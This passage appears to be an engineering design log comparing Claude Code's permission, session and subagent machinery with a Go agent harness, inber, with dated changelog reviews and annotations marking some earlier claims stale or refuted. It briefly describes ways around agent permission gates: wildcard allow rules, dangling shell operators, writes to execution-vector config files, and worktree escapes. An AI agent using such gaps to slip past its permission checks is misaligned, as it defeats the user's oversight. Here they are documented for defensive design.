# Claude Code Comparison

**Claude Code** — Anthropic's official CLI coding assistant. A terminal-based agent that can read, modify, and execute code across multiple files with sophisticated permission controls and session management.

## Architecture Overview

Claude Code follows a **tool-centric architecture** where individual tools (file operations, shell commands, etc.) are mediated through a comprehensive permission system. The agent operates through interactive sessions that can be resumed and continued, with project context maintained through CLAUDE.md files.

## Key Features for Inber

### 🔐 Tool Permission Model

**What it does well:**
- **Hierarchical permission system**: User → Project → Local settings with clear precedence
- **Three permission modes**: Allow (no prompt), Ask (confirm first), Deny (blocked)
- **Tool-specific controls**: Can allow/deny specific commands or entire tool categories
- **Session modes**: `default`, `acceptEdits`, `plan`, `dontAsk`, `bypassPermissions`
- **Granular rule syntax**: `Tool(specifier)` allows fine-grained control (e.g., `Bash(npm install)`)

**What inber should adopt:**
```go
type PermissionPolicy struct {
    Rules []PermissionRule
    Mode  SessionMode
}

type PermissionRule struct {
    Tool      string    // "bash", "file_write", etc.
    Specifier string    // optional: specific command/path pattern
    Action    Action    // Allow, Ask, Deny
}
```

**Current inber state:**
Inber currently prompts for all potentially dangerous operations but lacks fine-grained policy control. Users can't pre-approve specific commands or establish project-level policies.

### 🔄 Session Resume & Continuity

**What it does well:**
- **Session IDs**: Every conversation gets a persistent ID
- **Multiple resume modes**: `--resume` (interactive picker), `--resume <id>` (specific), `--continue` (most recent)
- **Resume in different modes**: Can resume interactively or in one-shot mode (`-p`)
- **Session metadata**: Shows timestamps, project dirs, conversation summaries

**What inber should adopt:**
```go
type SessionManager interface {
    SaveSession(id string, state SessionState) error
    ListSessions(limit int) ([]SessionMetadata, error)
    ResumeSession(id string) (*SessionState, error)
    GetMostRecent() (*SessionState, error)
}
```

**Current inber state:**
Inber's memory system provides some continuity but lacks explicit session IDs and resume capabilities. When an inber session ends, there's no direct way to pick up exactly where you left off.

### 📁 Multi-file Edit Strategy

**What it does well:**
- **Project-aware context**: Uses CLAUDE.md files for persistent project knowledge
- **Auto-discovery**: `/init` command analyzes codebase and generates starter configuration
- **Hierarchical context**: Project root → parent dirs → home folder for monorepos
- **Integrated tooling**: Understands build systems, test runners, and project structure

**CLAUDE.md example:**
```markdown
# Project Context
FastAPI REST API for user authentication and profiles.

## Key Directories
- `app/models/` - database models  
- `app/api/` - route handlers

## Standards
- Type hints required on all functions
- pytest for testing (fixtures in `tests/conftest.py`)

## Common Commands
uvicorn app.main:app --reload # dev server
pytest tests/ -v # run tests
```

**What inber should adopt:**
- **Project configuration files** (`INBER.md`?) that provide context automatically
- **Smart project detection** that recognizes common patterns (Go modules, package.json, etc.)
- **Context inheritance** for monorepo setups

**Current inber state:**
Inber reads some project files but lacks a systematic way for users to provide project context. Each session starts "cold" regarding project conventions and structure.

## Architectural Insights

### Permission System Design
Claude Code's permission model is **layered** (user/project/local) with **precedence rules** (deny → ask → allow). This allows both organizational policies and individual developer customization while maintaining security.

### Session vs Context Separation
Claude Code separates **conversation state** (session IDs, history) from **project context** (CLAUDE.md files). This allows resuming conversations while keeping project knowledge persistent across all sessions in that directory.

### Tool Abstraction
Their tool system appears to be **capability-based** — each tool declares what it can do, and the permission system mediates access. Tools seem to be self-contained with their own schemas and execution logic.

## What Inber Does Better

### Memory System
Inber's memory system (conversation + repo-map + stash) is more sophisticated than Claude Code's simple CLAUDE.md approach. Inber automatically captures and summarizes context rather than requiring manual configuration.

### Go Ecosystem Integration
Inber understands Go-specific patterns (modules, build tags, etc.) more deeply than Claude Code's generic approach.

### Context Management
Inber's smart truncation and context loading is more automatic — users don't need to configure what files are important.

## What Inber Should Steal

### 1. Permission Policy System
```go
// In engine/permissions.go
type PermissionEngine struct {
    policies []PermissionPolicy
    mode     SessionMode
}

func (pe *PermissionEngine) CheckTool(tool string, specifier string) Permission {
    // Implement deny → ask → allow precedence
}
```

### 2. Session Resume
```go
// In engine/session.go
func (e *Engine) SaveSession(id string) error {
    // Serialize conversation + context state
}

func (e *Engine) ResumeSession(id string) error {
    // Restore exact conversation state
}
```

### 3. Project Configuration
```go
// Load INBER.md files from current dir → parent → home
func LoadProjectContext() (*ProjectConfig, error) {
    // Similar to CLAUDE.md but Go-aware
}
```

## Implementation Priority

**High Priority:**
1. **Permission policies** — Solves real user pain points with repeated approvals
2. **Session IDs and resume** — Makes inber more professional/tool-like
3. **Project configuration files** — Reduces repetitive context explanations

**Medium Priority:**
1. **Tool interface standardization** — Enables permission system
2. **Enhanced session metadata** — Better session management UI

## Harness-watch — 2026-06-02: asyncRewake hook, tiered security review, path-sensitive permission escalation

The `security-guidance` plugin update (commits `441892ec`, `ccadef7d`) plus
CHANGELOG 2.1.160 surfaced several harness primitives.

### 1. `asyncRewake` — background review re-wakes a stopped agent with findings

The plugin's `hooks.json` uses a PostToolUse entry with `if: "Bash(git commit:*)"`,
`asyncRewake: true`, `rewakeMessage`, and `rewakeSummary`: on `git commit`/`push`
it kicks off a background agentic security review *without blocking the turn*, and
when results land the harness **re-wakes** the (possibly already-stopped) agent by
injecting `rewakeMessage` + findings as a new turn. A true async-feedback primitive,
distinct from a synchronous PreToolUse gate, guarded by a TTL loop counter
(`stop_hook_fire_count`, max firings, content-based dedup) to prevent
fix→re-review→re-fire loops.

**What inber should consider:** add an async post-tool hook channel — a hook can
return "pending" and later re-wake a stopped/idle session by injecting a synthetic
user turn (summary + payload), guarded by a per-session fire-count TTL to prevent
re-wake loops.

### 2. Three-layer cost-tiered security review

security-guidance v2 layers three escalating reviewers: (1) instant regex warnings
on Edit/Write for ~25 dangerous patterns (`yaml.load`, `pickle.load`, raw
`innerHTML`, hardcoded secrets); (2) a fast LLM diff review on the **Stop hook**
feeding high-severity findings back so Claude self-fixes before the user sees the
reply; (3) an SDK-driven agentic reviewer on `git commit` that uses Read/Grep/Glob
to trace cross-file data flow (IDOR/auth-bypass/SSRF a single diff misses). Org
policy is concatenated `claude-security-guidance.md` at user→project→project-local
scope with an 8KB budget that truncates project-local first. The escalation ladder
(cheap-always / medium-on-stop / expensive-on-commit) is reusable.

**What inber should consider:** model the PreToolUse prehook as a tiered ladder
rather than a single gate — cheap regex/heuristic on every edit, a Stop-time
fast-model diff review that self-corrects before responding, and an expensive
cross-file agentic review only on commit-class tools — sharing a layered
user/project/local policy file.

### 3. Path-sensitive permission escalation (the write *is* the execution vector)

CHANGELOG 2.1.160: even in `acceptEdits`/auto modes, Claude Code now prompts before
writing files that can silently cause code execution — shell-init (`.zshenv`,
`.zlogin`, `.bash_login`), `~/.config/git/`, build-tool config (`.npmrc`,
`.yarnrc*`, `bunfig.toml`, `.bazelrc`, `.pre-commit-config.yaml`, `.devcontainer/`).
A "safe" edit-only mode isn't safe when the edited file is itself an execution
vector. Also: a single-file grep/egrep/fgrep now satisfies the read-before-edit
precondition (any tool that observed current contents counts, not just Read).

**What inber should consider:** give the prehook a path-pattern escalation list —
writes to shell-init / VCS-config / build-tool config files always escalate to Ask,
overriding acceptEdits/auto, because the write itself is an execution primitive. And
if inber enforces a read-before-edit invariant, let any content-observing tool
(grep/search returning file lines) mark the file "seen" for the turn, not just the
dedicated Read tool.

> ⛔ **WALKED 2026-08-07 (nightly worker) — the read-before-edit half is LATENT and needs no
> further thought until that changes.** inber enforces no read-before-edit invariant at all:
> `grep -rn "read.before.edit\|readBeforeEdit\|has not been read"` over every `.go` file
> returns zero. The sentence is conditional ("if inber enforces") and the condition is false,
> so there is nothing to widen. The path-escalation half is a genuine feature proposal, not a
> defect, and belongs with the guard-mode work (`9eeba694`), not on the finding shelf.

The permission system would have the highest impact on daily usability while being relatively straightforward to implement given inber's existing tool architecture.

## Harness-watch — 2026-07-13: memory is the *non-derivable complement* of the codebase — a falsifiable rule for what to cut

[claude-code 2.1.206](https://github.com/anthropics/claude-code/commits/main/CHANGELOG.md) adds "a `/doctor` check that proposes trimming checked-in `CLAUDE.md` files by cutting content Claude could derive from the codebase." Small line, good idea. Every harness tells you to keep memory files short; nobody ships a *rule* for what to cut — so in practice memory files only grow. This criterion is falsifiable and automatable: **if the agent could recover the fact by reading the repo, it does not belong in memory.** Memory is for what is *not* in the source — preferences, decisions, landmines, non-obvious invariants, things that cost someone an afternoon to learn. It reframes memory from "helpful notes" to the non-derivable complement of the codebase. Note the deliberate posture: it **proposes**, it does not auto-delete.

> ⛔ **WALKED 2026-08-07 (nightly worker) — the premise below is FALSE twice over. Do not act on it.**
> (a) **inber has no top-level `MEMORY.md`, and never has.** `git log --all -- MEMORY.md` returns
> nothing and `git ls-files | grep -i memory` lists only source files. (b) **`:8160` is not
> memory-store.** `ss -tlnp` shows `:8160` is the `llm-bridge` gateway binary; memory-store is a
> library, not a service with a port (see repos CLAUDE.md). The accreting MEMORY.md the entry is
> actually describing is **Claude Code's own auto-memory on this host**
> (`~/.claude/projects/-home-kayushkincom-repos/memory/MEMORY.md`) — measured at **1,489 bytes**,
> 13 one-line index entries, and **zero** `FIXED`/`RESOLVED` markers. So the bloat the proposed
> pruning job would attack does not exist here, in either repo. The *idea* (memory is the
> non-derivable complement of the codebase) is still worth keeping; the inber-specific
> justification under it is not.

**What inber should consider:** inber has both a `memory-store` (:8160) and a large top-level `MEMORY.md` that only accretes (several entries are already marked FIXED/RESOLVED and are now pure context cost, paid on every session). A scheduler job that walks each memory entry with a cheap model and asks *"could you have derived this by reading the repo?"* — then files the candidates as a **proposal** rather than deleting — is roughly a day of work and attacks context bloat on every single session thereafter. Keep the propose-don't-apply posture; the same reason the noteboard decision backlog uses it. The complementary entry is 07-13 in `agentic-design-patterns.md`, which covers the *authority* half of claude-code's window (consent provenance, transcript tampering, headless consent banking).

Also worth noting from the same window, as independent corroboration rather than a new idea: 2.1.204 fixed "worktree-isolated subagents sometimes running shell commands in the parent checkout instead of their own worktree" — the **same scope-leak class** as codex #32197 in the 07-12 entry (sandbox cwd moved, writable roots didn't). Two harnesses shipped the identical bug in adjacent windows, which is a strong signal that inber's `forge` worktree slot deserves an explicit test that a worktree-confined agent *cannot* write to the parent checkout, rather than an assumption that it doesn't.
## Harness-watch — 2026-07-30 (CC 2.1.219): text the user already saw must survive the error that killed the turn — and a subagent tree deeper than one level needs event routing to match

[CC 2.1.219](https://github.com/anthropics/claude-code/blob/main/CHANGELOG.md) (2026-07-24) is
mostly Opus 5 plumbing, but two entries name defects inber has in its own equivalents. Neither is
about the CLI: inber talks to the Messages API directly through `anthropic-sdk-go`, so the
`--forward-subagent-text`, `mcp_server_errors` and `sandbox.*` settings themselves are unreachable
here. The *bugs behind them* are not.

### 1. "Fixed `claude -p` text output dropping the answer already produced when a turn dies on a mid-stream API error" — inber has this, and worse

inber streams deltas to the user and then throws the accumulated message away if the stream ends
badly. `agent/agent_run.go:153-170`: the loop calls `accumulated.Accumulate(event)` and fires
`a.hooks.OnTextDelta(...)` per chunk — so the user watches the answer arrive — but
`resp = &accumulated` happens **only** in the `else` branch of `streamResp.Err()`. On a mid-stream
error `resp` stays `nil` and `:188` returns `nil, fmt.Errorf("api call failed: %w", apiErr)`. The
discard then cascades: `agent/agent.go:265` returns early, so `processResponse` never counts tokens
and `*messages = append(*messages, resp.ToParam())` never runs — **the partial assistant turn never
enters conversation history**, making the work unrecoverable on the next turn. `engine/engine.go:228`
returns `nil`, skipping `postProcessResult` (the session log), `Guard.RecordTurn`, `Trace.RecordTurn`
and `Checkpoint.Take`. `server/spawn.go:227-250` guards on `result != nil`, so the request row
records status `error`, an empty summary, and **0 tokens → $0 cost for a call Anthropic already
billed**. Note the inconsistency that makes this clearly a bug and not a policy: the ctx-cancel and
max-API-calls paths (`agent/agent.go:203-214`) both write a placeholder into `result.Text`; only the
stream-error path writes nothing. The same discard sits at `agent_run.go:179-185`, where the
context-length retry re-issues non-streaming and abandons `accumulated` too.

**What inber should consider:** set `resp = &accumulated` before recording `apiErr`, and let
`agent.go:265` fall through to `processResponse` and the message append when `resp != nil` even with
a non-nil error. The invariant to state once and enforce everywhere: **bytes shown to the user are
already part of the conversation** — a later failure can annotate the turn, never un-say it. Usage
accounting rides along, which independently fixes billing a real call as $0.

### 2. "Subagents can now spawn nested subagents up to depth 3 (was 1)" — inber permits depth 2 and drops every event from it

CC pairs the depth raise with an escape hatch (`CLAUDE_CODE_MAX_SUBAGENT_SPAWN_DEPTH=1`) and, in
stream-json, forwards depth-2+ subagent text **keyed by its spawning Agent `tool_use` id** — the id
being the part that makes a deep tree addressable rather than merely permitted. inber already allows
the depth and has none of the routing. `MaxSpawnDepth` defaults to **2** (`server/config.go:23`,
`server/server.go:56-58`, enforced `server/spawn.go:57`), so root→child→grandchild is legal today.
But forwarding is hard-coded flat: `server/spawn.go:172` snapshots `parentOnEvent`, and the child's
filter at `:177` admits only `ev.Kind == "status" || ev.Kind == "thinking"`. When the child spawns a
grandchild, `parentOnEvent` resolves to *the child's own filter closure*, and the grandchild's
events arrive as `agent_update` / `agent_spawned` / `agent_done` — none of which match. **Every
depth-2 subagent is silently invisible on the root session's live stream.** Two related gaps: the
subagent identity and depth that `spawn.go:185-188` does put in `StreamEvent.Data` are discarded by
`streamEventToBridge`'s `default:` branch (`server/api_bridge.go:884-888`), which copies only
`Subtype` and `Message`, so an SSE client cannot tell which subagent or depth produced an update;
and `Store.SpawnChildren` (`server/store.go:266-272`) is `WHERE parent_request_id = ?`, one level,
so a grandchild's spend rolls up into no ancestor at any depth.

**What inber should consider:** either lower the default to 1 until routing is recursive, or make it
recursive — forward by re-emitting the child's event kinds rather than filtering to two, and carry
the `agent`/`depth`/`session_key` payload through `streamEventToBridge` instead of dropping it. The
transferable half of CC's design is the keying: an event from depth N is only useful if the consumer
can attribute it, which needs a stable id per spawning call. inber drops the tool id one layer
earlier — `engine/build_hooks.go:105` receives `toolID` and calls `d.OnToolCall(name, input)`
(`engine/display.go:15` has no id parameter), so `msg.ToolCallEvent.ToolID` is left empty at
`server/api_bridge.go:840-845` even though the bridge defines it. Same missing-identity root cause as
the goose #10716 entry.

> ⛔ **WALKED 2026-08-07 (nightly worker). This entry is now SPENT. Four claims, four different
> fates — do not re-derive any of them.**
>
> 1. **"Every depth-2 subagent is silently invisible" — FIXED, no longer true.** `13d87d1` made
>    the forwarder pass a descendant's envelope through unchanged; `server/spawn.go:96` is
>    `case eventKindAgentUpdate, eventKindAgentSpawned, eventKindAgentDone: emit(ev)`. Todo
>    `c81c4b63`.
> 2. **`msg.ToolCallEvent.ToolID` always empty — FIXED tonight, inber `0d72bc3`.** The id was
>    dropped only on `DisplayHooks`, which took `(name, input)`; it now takes `toolID`, and
>    `StreamEvent.ToolID` carries it to `api_bridge`. The live cost was larger than this entry
>    says: bridge-ui pairs call to result by `tool_id`, so an empty id put them in unrelated
>    rows and the tool **output was discarded**, not merely unlabelled.
> 3. **"`Store.SpawnChildren` … a grandchild's spend rolls up into no ancestor at any depth" —
>    REFUTED. Do not file this.** `server/spawn.go:262-266` resolves `ActiveRequest(req.ParentKey)`
>    and `:281` writes it as the child's `parent_request_id`, so a grandchild IS linked — to its
>    immediate parent. The query (now at `server/store.go:572-579`, not `:266-272`) is a normal
>    one-hop adjacency lookup; a caller wanting a subtree recurses. And there is no caller:
>    `SpawnChildren` has exactly one reference in the repo, `server/store_test.go:130`. No
>    aggregate over `requests` exists anywhere (no `SUM`, no `GROUP BY`), and the only dollar cap,
>    `guard/guard.go:287`, is fed solely by the session's own turns via `RecordCost`. There is no
>    rollup for a grandchild to fall out of.
> 4. **The `agent_*` attribution drop — CONFIRMED and FILED as `e37fc5f4`.** `Data` carries
>    `agent`/`session_key`/`parent_key`/`depth` (and `status` on `agent_done`), and
>    `streamEventToBridge`'s `default:` branch copies only `Subtype` and `Message`. Left open
>    because mapping it onto `msg.SystemEvent`'s `TaskID`/`SubagentType`/`TaskStatus` is a
>    protocol question spanning three repos.
>
> Note the doc's line numbers were stale in every case (`store.go:266-272`, `server.go:56-58`,
> `spawn.go:57`, `build_hooks.go:105`, `api_bridge.go:840-845`). Re-locate by symbol, not line.

### 3. Two settings with no inber analogue, recorded so the gap is named

`sandbox.network.strictAllowlist` denies non-allowlisted hosts for sandboxed commands **without
prompting** — i.e. egress is a policy axis separate from command approval. inber has no egress axis
at all, and no command axis either: `guard.CheckTool` has zero non-test callers and the mode is
hardwired `guard.Autonomous` (`engine/engine.go:169-171`), whose `default:` branch returns
`Allowed`, while `tools/tools.go:45-52` registers `Browser`, `WebSearch`, `WebFetch` and a
`bash -c` shell that inherits the full `os.Environ()`. That absence is already ranked in
`docs/harness-control-matrix.md:66,78`; what is new is the *shape* worth copying when it is built —
a host allowlist consulted without a prompt, so the sandbox is not merely advisory. Separately,
`mcp_server_errors` in the init event exists so a server dropped by config validation is visible
rather than silently missing; inber emits no init/system event and `msg.SystemEvent.MCPServers` is
never populated, which is moot only because `tools/mcp/` still has zero importers
(`harness-control-matrix.md:91`) — worth wiring at the same time as the client.

> ⛔ **WALKED 2026-08-07 (nightly worker). The load-bearing claim here is STALE — do not repeat it.**
> "`guard.CheckTool` has zero non-test callers and the mode is hardwired `guard.Autonomous`" was
> true when written and is not now. `engine/build_hooks.go:94` is
> `switch e.Guard.CheckTool(tool, input)`, and the mode comes from config:
> `engine/engine.go:201` `mode, err := guard.ParseMode(cfg.Mode)` feeding
> `:205` `e.Guard = guard.New(e.Limits.GuardConfig(mode))`. The gate is wired. What is genuinely
> still open is *which tools are classified* — nine names reach the model unclassified, so Assist
> allows them unasked. That is filed as `9eeba694`, not here.
>
> The egress-axis and `mcp_server_errors` halves stand as written: both are absent, and both are
> latent while `tools/mcp/` has no importer. The worktree-confinement point in the 2026-07-13
> entry above is already filed as `d967400a` (an A/B/C/D policy call), so it needs no new todo —
> `forge` IS live in inber (`server/spawn.go`, `engine/engine_new.go` import it), so that one is
> live rather than latent.

## Harness-watch — 2026-08-20 (CC 2.1.236–2.1.237): a subscriber needs an identity and a lifetime — inber's SSE fan-out is one mutable slot, so the next turn unsubscribes the viewer and the viewer's exit mutes the turn

Two releases landed in this window: [2.1.236](https://github.com/anthropics/claude-code/commit/084ca20b)
and [2.1.237](https://github.com/anthropics/claude-code/commit/770933ea). Both are CLI features inber
cannot use directly, but one line in each names a rule inber breaks. 2.1.236 adds `notify_when_idle`
to cross-session `SendMessage` — "opt-in, one-shot, no polling" — and, in the same release,
"`SendMessage` now refuses further messages to a session up front once a rapid burst would exceed
what that session's inbox accepts, **instead of reporting them sent while they were dropped**." The
pair states one principle twice: a subscription is a registered thing with an owner and an end, and
delivery that cannot happen must be refused rather than silently discarded.

### 1. The bridge's "persistent SSE subscription" is a single mutable callback slot — two different events unsubscribe it, and one of them mutes an unrelated live turn

`handleBridgeEvents` (`server/api_bridge.go:336`, commented "persistent SSE subscription") subscribes
by *overwriting* a field: it takes `sess.mu`, saves `origOnEvent := sess.onEvent`, installs a closure
that calls the old one and then fans out to its own channel, and restores the saved value on exit
(`server/api_bridge.go:364-384`). There is no subscriber list. `Session.onEvent` is one slot, and its
own comment says what it was built for — `// current request's event callback (updated per-turn)`
(`server/session.go:67`). `setOnEvent` (`server/session.go:72-76`) overwrites it unconditionally, and
`getOrCreateSession` calls `setOnEvent` on **every** run and stream against a live session
(`server/session_creation.go:26`, `:34`), after which `Session.turn` rebuilds the engine's display
hooks from whatever is in the slot (`server/session.go:151-152`). Three producers install callbacks
this way — the HTTP run path, the NATS bus (`server/bus.go:114`) and spawn delivery
(`server/spawn_delivery.go:114-116`) — and each one silently evicts whoever held the slot.

That gives two failures from one root cause. **A viewer goes deaf:** an SSE client attached while the
session is idle stops receiving anything the moment any other caller starts a turn, which is the only
moment it exists for; the HTTP connection stays open and streams nothing, so the client cannot tell
subscription from silence. **A viewer's exit mutes someone else:** the deferred restore at
`server/api_bridge.go:379-384` writes back the callback captured at subscribe time. If a turn started
after that, closing the SSE tab replaces that turn's live writer with a dead closure from a finished
request, and `updateHooks()` on the next line pushes it into the running engine — the streaming
caller stops receiving output mid-turn, for a reason that happened in a different connection. Nothing
logs either transition.

**What inber should consider:** make the subscriber plural — a map of id → callback on `Session`,
with subscribe and unsubscribe by that id, so a restore can never clobber a stranger. **What a fix
must decide:** whether the per-request writer stays privileged. Today "the current request's writer"
and "a long-lived observer" are the same field, and the run path depends on last-write-wins to point
the hooks at the caller now streaming. A subscriber set has to say which callbacks a new turn
replaces (the request writer) and which survive it (observers), or the bus, spawn delivery and the
bridge start delivering each other's turns.

### 2. A slow SSE client loses events silently, and the frames carry no id, so it cannot detect the gap

The fan-out closure sends to a 100-deep buffer with a bare `default:` and no logging, counter or
marker (`server/api_bridge.go:371-374`). The frames it feeds are written as `event:`/`data:` only
(`server/api_bridge.go:397-399`), with no `id:` field, so a client that fell behind during a burst of
deltas receives a transcript with a hole in it and no way to know. This is exactly the shape 2.1.235
and 2.1.236 closed on `SendMessage` twice — refuse up front rather than report a delivery that did
not occur. The neighbouring drop in this repo is not the same: `offerToTurnInFlightLocked`
(`server/session.go:280-287`) also selects with a `default:`, but it logs a warning, returns `false`,
and `deliver` falls the message back to the pending queue, so nothing is lost.

**What inber should consider:** number the frames and let the client see the gap — an `id:` per event
plus a drop counter in the next frame costs nothing and turns silent loss into a visible one. **What
a fix must decide:** what to do when the buffer is genuinely full. Blocking is not free here: the
closure runs on the token-streaming goroutine, so a stalled reader would stall the turn itself. Drop
with a marker, coalesce deltas, or disconnect the slow client are three different answers with
different blast radii, and this entry does not pick one.

### Checked and not worth a finding

- **"Fixed prompt caching for sessions using an LLM gateway or custom base URL" (2.1.237)** — inber
  never sets a base URL on the Anthropic path (`agent/clients.go:103-129` passes auth and headers and
  no `option.WithBaseURL`), so there is no inber-side gateway path to break. Worth recording, since it
  is not obvious: the SDK still honours `ANTHROPIC_BASE_URL` from the environment
  (`anthropic-sdk-go@v1.35.0/client.go:34`), so a gateway *can* be interposed on this host without a
  line of inber config — and the OAuth branch would send its `sk-ant-oat01-` token there in a header,
  which body-side egress redaction cannot see by construction.
- **`ANTHROPIC_DEFAULT_MODEL` vs `ANTHROPIC_MODEL` (2.1.236)** — a two-tier default where an explicit
  pick outranks the environment. inber resolves the model per agent through model-store already; no
  competing environment tier exists to disambiguate.
- **Sandbox wildcard read-deny precedence (2.1.236)** — `guard.CheckTool` is a tool-*name* switch with
  no path rules (`guard/guard.go:158-184`). No shape to check, as previously recorded.
- **Recap text capped at 400 characters (2.1.236)** — bounding a generated artifact so it cannot grow
  without limit; the same rule as the compaction-prompt entry of 2026-08-16, already filed.
- **"Concise" output style, `/model` picker sizing, fullscreen renderer fallback, spellcheck** — CLI
  presentation, no analogue.

## Harness-watch — 2026-08-22 (CC 2.1.238–2.1.239): a transport-shape misdetection that silently doubles billing is a shipping-priority bug, and CC has converged on the delivery-route answer inber already had

Both upstream commits in this window are CHANGELOG/feed-only —
`8a8e81d0` (2026-08-20) carries **2.1.238**, `16440d0f` (2026-08-21) carries
**2.1.239**. Three items have a real invariant behind them.

**1. A misdetected transport shape that silently re-runs the turn (2.1.239).**
CC fixed "Bedrock streaming behind proxies that strip the response Content-Type
header, which silently doubled billed API calls by re-running every turn
non-streaming." The point is not Bedrock; it is that a *guess* about response
shape, wrong in a way nothing surfaces, doubles the bill for every turn.

inber's structural twin is live and already recorded — this is new upstream
evidence for it, not a new finding. `engine/turn_execute.go:45-50` re-runs the
**entire turn** when `apiutil.IsThinkingSignatureError(err)`, and that predicate's
complete body is `msg == "Error"` (`internal/apiutil/apiutil.go:6-13`): a
string-equality guess against the bare word "Error" that triggers a full duplicate
billed turn *and* destroys all thinking in the conversation. Recorded at
`goose.md:535,1072`. **What inber should consider:** hang this citation on that
existing item rather than opening a new one — what it adds is that a major harness
treated exactly this failure mode as ship-blocking, which is the argument for
raising its priority rather than its novelty.

**2. Delivery that reports refusal instead of silent success (2.1.238).** Two
entries: sending to a session that refuses inbound messages "now reports 'refused'
to the sender instead of a silent success", and a session whose inbox drops
messages to a rate limit or a full queue "now tells your session, instead of the
messages vanishing silently."

**inber is ahead here and it is worth saying so.** `Session.deliver`
(`server/session.go:302-314`) returns a `DeliveryRoute` and its own comment states
there is "deliberately no route that means lost" — a message that cannot go
mid-turn falls back to the pending queue rather than disappearing. The two places
inber still genuinely drops are already documented:
`server/spawn_delivery.go:47-51` (parent gone) and `bus/client.go:70-75` (full
channel), at `agentic-design-patterns.md:2610,2633`. Nothing to import; a
convergence to record.

**3. Releasing subagent tool results once they leave the display window
(2.1.238).** CC fixed "unbounded memory growth in long interactive sessions" this
way. inber's `agent/read_cache.go:33` `files map[string]readEntry` is per-session
and unbounded — entries leave only via `Invalidate` (`:82`) or `InvalidateAll`
(`:96`), with no TTL and no size cap. **Not filed as a defect:** an entry is a path
plus a line count, so the growth is kilobytes over a session, not the hundreds of
megabytes CC was dealing with. Recorded as an idea, and as the shape to reach for
if the cache ever starts holding content.

### Screened, no inber surface

- **2.1.239 "session titles disappearing after ~64KB"** is the `bufio.Scanner`
  64KB default class, and inber's instance of it — `tools/mcp/client.go:155`
  scanning `c.stdout` with no `.Buffer()`, while the repo's other three scanners
  are all explicitly resized — is already at
  `agentic-design-patterns.md:5077-5094`.
- **2.1.239 "Esc with a prompt queued lets the next turn finish early"** touches
  the same nerve as inber's unobservable `Error` status —
  `server/session.go:177-179` sets `s.Status = Error` and the deferred function at
  `:166-173` unconditionally overwrites it with `Idle` — already at
  `cline.md:761-764`.

## Harness-watch — 2026-08-26 (CC 2.1.243, 2.1.246): cache TTL is two settings, not one — and a subagent stopped by its own cap must return its output *marked partial*

Ten CHANGELOG commits in the window, spanning **2.1.236 through 2.1.246**. There
is no 2.1.242 or 2.1.244 — those numbers were never published — and **2.1.243 was
published (2026-08-24 23:40Z), fully reverted out of the changelog (08-25 03:38Z)
and restored ~1.5h later** alongside 2.1.245, whose single entry is a startup
crash on glibc 2.44. 2.1.240 and 2.1.241 are each *"Bug fixes and reliability
improvements"* and nothing else; 2.1.236–2.1.239 are covered at `:364` and `:444`
above and in `agentic-design-patterns.md`'s 08-25 entry. The rest of this section
is what is new.

### 1. `promptCacheTtl` and `subagentPromptCacheTtl` — the main thread and the fan-out have opposite cache economics

2.1.243, verbatim: *"Added `promptCacheTtl` and `subagentPromptCacheTtl` settings
so API-key and cloud-provider users can keep a 1-hour prompt cache on the main
conversation while subagents stay at 5 minutes."*

The reasoning is not stated but is not hard to reconstruct: a 1-hour cache write
costs more than a 5-minute one, and it pays off only when the prefix is reused
after the 5-minute window. A long-lived orchestrator that thinks between turns
reuses its prefix on that timescale. A fan-out of short-lived children does not —
each child writes a prefix nobody reads twice, so paying the 1-hour premium for
them is pure loss. One knob cannot express both, which is why there are two.

**What inber should consider:** inber sets no TTL anywhere. All four breakpoint
sites call `anthropic.NewCacheControlEphemeralParam()` with no argument —
`agent/agent_run.go:36` (last tool definition, BP1),
`engine/turn_prompt.go:218,224` (system, BP2), and `agent/agent.go:549-556`
(history, BP3) — so everything inber caches is on the 5-minute default.
`docs/cache-optimization.md:279` already raises the 1-hour option (*"for
long-running sessions, pay more per write but fewer misses"*) and never resolves
it; upstream's answer is that it is not one decision but two, split on whether the
session is a parent or a child. inber has that distinction available at the point
it matters — `server/spawn.go` mints the child and `child.SpawnDepth` is already
carried — so the split is expressible today. What a change would have to decide is
**what "long-running" means for the parent**, because the premium is wasted on an
orchestrator that is also short, and inber has never measured the inter-turn gap
distribution on this host. That measurement is the prerequisite; the guard rail is
that `reportCallsThatBoughtNoCache` (`engine/turn_postprocess.go:107`) is the only
live cache reporter and it counts one cause of miss, not this one.

### 2. A subagent stopped by its own limit must say so — and inber gets this right

2.1.246, verbatim: *"Improved subagent results: a subagent that stops at its
`maxTurns` limit now returns its output marked as partial, with a hint to continue
it via `SendMessage`, instead of appearing finished."*

This is the same claim as opencode #43892 from 08-22 — *an unrecognized completion
is not a successful one* — arriving from the delegation side rather than the
finish-reason side. A parent that reads a capped child's output as a finished
answer will roll it up as one, and nothing downstream can tell.

**Checked against inber, and the answer is that inber already holds the
property.** `Agent.Run`'s runaway cap returns an error rather than a value:
`agent/agent.go:337-342` is `if apiCalls > maxAPICalls { … return result,
fmt.Errorf("%w (%d)", ErrMaxAPICallsExceeded, maxAPICalls) }`, and it writes
`[Agent stopped: exceeded 50 API calls in one turn]` into `result.Text` when the
turn produced no text of its own. The guard's between-turn caps do the same at a
level up — `RunTurn` returns `fmt.Errorf("guard: %s", reason)` before doing any
work (`engine/engine.go:255-259`). The spawn wrapper then reads that error:
`server/spawn.go:315-320` sets `status = "error"` with `errMsg`, and `SpawnResult`
carries `Status` and `Error` to the parent alongside `Summary`
(`server/spawn.go:109-127`). So a capped child does not reach its parent looking
finished.

Two gaps worth naming rather than filing. `status` is a three-value string
(`"success"`, `"error"`, `"timeout"`) with no `"partial"`, so a parent cannot
distinguish *the child failed* from *the child ran out of budget and this is what
it had* — which is precisely the distinction 2.1.246 introduces, and it is the
difference between discarding the result and continuing it. And there is no
continuation handle: upstream's *"hint to continue it via `SendMessage`"* has an
inber analogue in `steer_agent`, but nothing in `SpawnResult` tells the parent the
child is still resumable. Both are additions to a wire type rather than defects in
one, so neither is filed.

### 3. The rest, ranked

**Permission model.** 2.1.246 adds a startup warning for Bash allow rules with a
wildcard *before* the subcommand (`Bash(git * main)`) *"since they also match
options inserted before the subcommand"* — the same class as the 2026-08-20
finding that a git subcommand's argv is not its authority, arriving from the
allowlist side; and it now *"always require[s] approval for malformed commands
with a dangling `&&` or `||` operator"*, closing a parse-ambiguity bypass. 2.1.246
also stops MCP tools marked `requiresUserInteraction` from offering "don't ask
again", because the rule that option wrote *"the tool then ignored"* — a prompt
that lied about its own effect. 2.1.238 narrowed plugin `headersHelper` to require
folder trust and to run **without inherited credential env vars**; the
credential-env half is already documented at
`agentic-design-patterns.md:3922-3949` with an open todo.

**Credentials.** 2.1.246: *"Fixed telemetry and metrics requests to Anthropic
